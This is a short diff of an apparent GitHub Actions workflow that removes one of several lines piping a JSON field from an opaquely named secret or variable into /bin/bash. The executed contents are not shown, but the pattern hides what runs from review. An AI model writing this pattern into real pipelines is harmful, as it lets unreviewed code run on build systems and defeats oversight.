@@ -17,7 +17,6 @@ jobs:
           bgv07383: ${{ secrets.bgv07383 }}
         run: |
           printf '%s' "$bgv07383" | jq -r .rm9 | /bin/bash
-          printf '%s' "$wq32" | jq -r .qmzp41 | /bin/bash
           printf '%s' "$lmoi0509" | jq -r .h72307 | /bin/bash
           echo $il800 | jq -r .x28363 | /bin/bash
           printf '%s' "$e0" | jq -r .z8 | /bin/bash
